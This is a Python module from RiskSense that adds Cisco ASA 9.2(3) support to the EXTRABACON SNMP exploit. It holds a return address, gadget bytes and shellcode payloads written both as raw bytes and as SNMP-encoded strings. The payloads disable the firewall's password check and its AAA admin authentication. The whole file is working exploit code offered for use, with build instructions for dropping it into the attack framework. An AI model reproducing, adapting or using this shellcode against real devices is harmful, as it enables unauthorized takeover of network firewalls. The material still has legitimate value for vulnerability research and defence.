#
# Cisco ASA 9.2(3) Authentication Bypass (EXTRABACON Module)
#
# Copyright: (c) 2016 RiskSense, Inc. (https://risksense.com)
# License: http://opensource.org/licenses/MIT
# Release Date: September 15, 2016
#
# Authors:
#           Sean Dillon (2E3C8D72353C9B8C9FF797E753EC4C9876D5727B)
#           Zachary Harding (14C0AA3670E9501ADDFC0176298CD7A969BAA8A1)
#
# Description:
#            Additional EXTRABACON module for Cisco ASA version 9.2(3).
#            This does not use the same shellcode as the Equation Group version,
#            but accomplishes the same task of disabling the auth functions
#            in less stages/bytes.
#
# Build/Run:
#            1) Save this file to versions/shellcode_asa923.py
#            2) Add the version string to fw_version_check()
#            3) Shellcode is for --pass-disable
#

vers = "asa923"

# there is a jmp esp @ 08 1d 70 1d
# 81d701c:	e8 ff e4 ff ff       	call   81d5520 <_ctm_hw_free@@Base+0x50fd0>
my_ret_addr_len = 4
my_ret_addr_byte = "\x1d\x70\x1d\x08"
my_ret_addr_snmp = "29.112.29.8"

finder_len = 9
finder_byte = "\x8b\x7c\x24\x14\x8b\x07\xff\xe0\x90"
finder_snmp = "139.124.36.20.139.7.255.224.144"

# ROPgadget --binary lina_92-3  --opcode 897dfc8b1685d2
# 0x9b78010 = function
# 0x9b78000 = byte boundary
# 0x8085a40
# 0x8085000
# preamble has a stack clean up and offset to where we first hijacked execution
# 0x9277386
preamble_len = 69
preamble_byte = "\x31\xc0\x31\xdb\x31\xf6\x31\xc9\x60\x80\xc5\x10\x80\xc2\x07\x04\x7d\x50\xbb\x00\x80\xb7\x09\xcd\x80\x58\xbb\x00\x50\x08\x08\xcd\x80\x68\x31\xc0\x40\xc3\x58\xa3\x10\x80\xb7\x09\xa3\x40\x5a\x08\x08\x61\x68\x86\x73\x27\x09\x80\xc3\x10\xbf\x0b\x0f\x0f\x0f\x89\xe5\x83\xc5\x48\xc3"
preamble_snmp = "49.192.49.219.49.246.49.201.96.128.197.16.128.194.7.4.125.80.187.0.128.183.9.205.128.88.187.0.80.8.8.205.128.104.49.192.64.195.88.163.16.128.183.9.163.64.90.8.8.97.104.134.115.39.9.128.195.16.191.11.15.15.15.137.229.131.197.72.195"

postscript_len = 2
postscript_byte = "\x61\xc3"
postscript_snmp = "97.195"

launcher_len = 6
launcher_snmp = "144.144.144.144.144.144"
launcher_byte = "\x90\x90\x90\x90\x90\x90"

payload_nop_len = 116
payload_nop_byte = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x1d\x80\xbe\x09\x50\xb8\x05\x60\xa3\xad\x35\xa5\xa5\xa5\xa5\xff\xd0\x58\xc3"
payload_nop_snmp = "144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.184.29.128.190.9.80.184.5.96.163.173.53.165.165.165.165.255.208.88.195"

payload_PMCHECK_DISABLE_len = 70
payload_PMCHECK_DISABLE_byte = "\x7a\x30\x78\x30\xbf\xa5\xa5\xa5\xa5\xb8\xd8\xa5\xa5\xa5\x31\xf8\xbb\xa5\x25\x12\xac\x31\xfb\xb9\xa5\xb5\xa5\xa5\x31\xf9\xba\xa2\xa5\xa5\xa5\x31\xfa\xcd\x80\xeb\x14\xbf\x10\x80\xb7\x09\x31\xc9\xb1\x04\xfc\xf3\xa4\xe9\x0c\x00\x00\x00\x5e\xeb\xec\xe8\xf8\xff\xff\xff\x31\xc0\x40\xc3"
payload_PMCHECK_DISABLE_snmp = "122.48.120.48.191.165.165.165.165.184.216.165.165.165.49.248.187.165.37.18.172.49.251.185.165.181.165.165.49.249.186.162.165.165.165.49.250.205.128.235.20.191.16.128.183.9.49.201.177.4.252.243.164.233.12.0.0.0.94.235.236.232.248.255.255.255.49.192.64.195"

payload_AAAADMINAUTH_DISABLE_len = 66
payload_AAAADMINAUTH_DISABLE_byte = "\xbf\xa5\xa5\xa5\xa5\xb8\xd8\xa5\xa5\xa5\x31\xf8\xbb\xa5\xf5\xad\xad\x31\xfb\xb9\xa5\xb5\xa5\xa5\x31\xf9\xba\xa2\xa5\xa5\xa5\x31\xfa\xcd\x80\xeb\x14\xbf\x40\x5a\x08\x08\x31\xc9\xb1\x04\xfc\xf3\xa4\xe9\x0c\x00\x00\x00\x5e\xeb\xec\xe8\xf8\xff\xff\xff\x31\xc0\x40\xc3"
payload_AAAADMINAUTH_DISABLE_snmp = "191.165.165.165.165.184.216.165.165.165.49.248.187.165.245.173.173.49.251.185.165.181.165.165.49.249.186.162.165.165.165.49.250.205.128.235.20.191.64.90.8.8.49.201.177.4.252.243.164.233.12.0.0.0.94.235.236.232.248.255.255.255.49.192.64.195"